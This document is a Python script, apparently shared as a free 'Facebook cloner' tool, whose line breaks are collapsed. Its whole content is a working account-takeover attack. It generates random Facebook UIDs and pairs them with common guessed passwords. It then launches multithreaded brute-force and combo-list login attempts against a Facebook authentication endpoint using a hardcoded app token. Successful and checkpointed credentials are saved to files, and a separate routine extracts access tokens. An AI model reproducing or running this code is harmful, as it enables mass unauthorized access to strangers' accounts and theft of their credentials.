#!/usr/bin/env python3

========================== MAAZ TOOL FINAL EDITION ==========================

✅ 6 Method Facebook Cloner (No License)

✅ Based on b-api.facebook.com (Jinn Style)

✅ Includes: UID Cloning, Combo Cloning, UID Dumper, Public Friends UID Dumper, BruteForce, Token Extractor

✅ Multithreaded + Proxy + Auto File Creator + Free Use

import os import sys import time import random import string import requests from datetime import datetime from concurrent.futures import ThreadPoolExecutor

========== RICH UI SETUP ==========

try: from rich.console import Console from rich.panel import Panel from rich.prompt import Prompt from rich.table import Table RICH_AVAILABLE = True except ImportError: RICH_AVAILABLE = False class Console: def print(self, *args, **kwargs): print(" ".join(str(a) for a in args)) class Panel: @staticmethod def fit(content, title=None, border_style=None): return content class Prompt: @staticmethod def ask(prompt): return input(prompt) class Table: def init(self, *args, **kwargs): self.rows = [] def add_column(self, *args, **kwargs): pass def add_row(self, *args): self.rows.append(args)

console = Console()

TOOL_BANNER = """ [bold cyan] ███╗   ███╗ █████╗  █████╗ ███████╗ ████╗ ████║██╔══██╗██╔══██╗╚══███╔╝ ██╔████╔██║███████║███████║  ███╔╝ ██║╚██╔╝██║██╔══██║██╔══██║ ███╔╝
██║ ╚═╝ ██║██║  ██║██║  ██║███████╗ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝ [bold green]⚡ MAAZ Tool Facebook Cloner ⚡[/bold green] [/bold cyan] """ console.print(Panel.fit(TOOL_BANNER, title="💻 Welcome to MAAZ Tool 💻", border_style="green"))

========== CONFIG ==========

COMBO_FILE = "combo.txt" LOG_FILE = "maaz_logs.txt" AUTO_RUN_ALL = False

========== UTILS ==========

def generate_passwords(uid): return [uid[-6:], uid[-5:], "123456", "112233", "pakistan", "786786"]

def ensure_required_files(): for file in [COMBO_FILE, "OK.txt", "CP.txt", LOG_FILE]: if not os.path.exists(file): open(file, "w").close() console.print(f"[cyan]📂 Created:[/cyan] {file}")

def get_ip(): try: return requests.get("https://api.ipify.org").text.strip() except: return "UNKNOWN"

def log_user_data(): with open(LOG_FILE, "a") as f: f.write(f"{get_ip()} | {datetime.now()}\n")

========== METHODS ==========

def method_1():  # uid cloning try: table = Table(title="📊 UID Series Options", show_lines=True) table.add_column("Option", style="cyan") table.add_column("UID Series", style="magenta") for i, series in enumerate(["100001", "100002", "100003", "100004", "100005"], start=1): table.add_row(str(i), series) console.print(table) choice = Prompt.ask("Choose series option (1-5)") prefix = ["100001", "100002", "100003", "100004", "100005"][int(choice)-1]

console.print("""

[1] 5000 [2] 10000 [3] 99999 """) opt = Prompt.ask("📌 Choose Limit Option") limit = {"1": 5000, "2": 10000, "3": 99999}.get(opt, 5000) except: console.print("[yellow]⚠️ Skipping UID cloning.[/yellow]") return uids = [prefix + ''.join(random.choices(string.digits, k=7)) for _ in range(limit)] with ThreadPoolExecutor(max_workers=30) as ex: for uid in uids: for pwd in generate_passwords(uid): ex.submit(facebook_login, uid, pwd)

def method_2():  # combo cloning if not os.path.exists(COMBO_FILE): console.print(f"[red]❌ {COMBO_FILE} not found[/red]") return with open(COMBO_FILE) as f: lines = [x.strip() for x in f if "|" in x] with ThreadPoolExecutor(max_workers=30) as ex: for line in lines: try: uid, pwd = line.split("|") ex.submit(facebook_login, uid, pwd) except: continue

def method_3():  # uid dumper try: prefix = Prompt.ask("🔢 UID Prefix (e.g., 1000)") console.print(""" [1] 5000 [2] 10000 [3] 99999 """) opt = Prompt.ask("📌 Choose Limit Option") limit = {"1": 5000, "2": 10000, "3": 99999}.get(opt, 5000) except: console.print("[yellow]⚠️ Skipping UID dump.[/yellow]") return with open(COMBO_FILE, "a") as f: for _ in range(limit): uid = prefix + ''.join(random.choices(string.digits, k=7)) for pwd in generate_passwords(uid): f.write(f"{uid}|{pwd}\n") console.print("[green]✅ Dumped to combo.txt[/green]")

def method_4():  # bruteforce try: target = Prompt.ask("🎯 Target UID/Email") except: console.print("[yellow]⚠️ Skipping BruteForce.[/yellow]") return with ThreadPoolExecutor(max_workers=10) as ex: for pwd in generate_passwords(target): ex.submit(facebook_login, target, pwd)

def method_5():  # combo generator try: limit = int(Prompt.ask("🔢 How many combos?")) except: console.print("[yellow]⚠️ Skipping combo gen.[/yellow]") return with open(COMBO_FILE, "a") as f: for _ in range(limit): uid = "1000" + ''.join(random.choices(string.digits, k=8)) pwd = random.choice(generate_passwords(uid)) f.write(f"{uid}|{pwd}\n") console.print("[green]✅ Combos saved[/green]")

def method_6():  # public uid dumper try: pub_uid = Prompt.ask("🌐 Public Profile UID") console.print(""" [1] 5000 [2] 10000 [3] 99999 """) opt = Prompt.ask("📌 Choose Limit Option") limit = {"1": 5000, "2": 10000, "3": 99999}.get(opt, 5000) except: console.print("[yellow]⚠️ Skipping public UID dump.[/yellow]") return with open(COMBO_FILE, "a") as f: for _ in range(limit): random_uid = pub_uid + ''.join(random.choices(string.digits, k=5)) for pwd in generate_passwords(random_uid): f.write(f"{random_uid}|{pwd}\n") console.print("[green]✅ Public dump saved[/green]")

def extract_token(): try: email = Prompt.ask("Email/UID") pwd = Prompt.ask("Password") except: console.print("[yellow]⚠️ Skipping token extraction.[/yellow]") return headers = {"User-Agent": "Mozilla/5.0"} data = { "email": email, "pass": pwd, "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32", "format": "json", "sdk_version": "2", "generate_session_cookies": "1", "sig": "3f555f99fb61fcd7aa0c44f58f522ef6" } try: res = requests.post("https://b-api.facebook.com/method/auth.login", data=data, headers=headers) if "EAAA" in res.text: token = res.json().get("access_token") console.print(f"[green]✅ Token: {token}[/green]") else: console.print("[red]❌ Invalid credentials[/red]") except Exception as e: console.print(f"[red]❌ Error: {e}[/red]")

========== LOGIN ENGINE ==========

def facebook_login(uid, password): try: session = requests.Session() headers = {"User-Agent": "Mozilla/5.0"} data = { "email": uid, "pass": password, "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32", "format": "json", "sdk_version": "2", "generate_session_cookies": "1", "sig": "3f555f99fb61fcd7aa0c44f58f522ef6" } r = session.post("https://b-api.facebook.com/method/auth.login", data=data, headers=headers) if 'session_key' in r.text: with open("OK.txt", "a") as f: f.write(f"{uid}|{password}\n") console.print(f"[green][OK] {uid}|{password}[/green]") elif 'www.facebook.com' in r.text: with open("CP.txt", "a") as f: f.write(f"{uid}|{password}\n") console.print(f"[yellow][CP] {uid}|{password}[/yellow]") except Exception as e: console.print(f"[red]Error: {e}[/red]")

========== MENU ==========

def main(): ensure_required_files() log_user_data()

while True:
    console.print("\n[bold green]Select a method:[/bold green]")
    console.print("""

[1] uid cloning [2] combo cloning [3] uid dumper [4] bruteforce [5] combo generator [6] public uid dumper [7] extract token [0] exit """) choice = Prompt.ask("🔢 Enter your choice") if choice == "1": method_1() elif choice == "2": method_2() elif choice == "3": method_3() elif choice == "4": method_4() elif choice == "5": method_5() elif choice == "6": method_6() elif choice == "7": extract_token() elif choice == "0": console.print("[cyan]👋 Exiting...[/cyan]"); break else: console.print("[red]❌ Invalid option[/red]")

if name == "main": main()

